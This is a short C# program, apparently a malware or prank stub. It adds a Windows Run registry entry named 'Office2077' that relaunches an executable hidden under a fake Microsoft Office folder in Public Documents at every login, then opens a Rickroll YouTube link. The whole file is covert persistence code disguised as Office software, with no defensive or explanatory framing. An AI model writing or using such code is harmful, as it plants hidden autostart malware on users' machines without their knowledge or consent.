using System;
using System.Diagnostics;
using System.Runtime;
using System.IO;
using Microsoft.Win32;
namespace SideSalvie
{
	class Program
	{
		static void Main(string[] args)
		{
			RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
			key.SetValue("Office2077", @"C:\Users\Public\Documents\Microsoft Office\office.exe");
			System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
		}
	}
}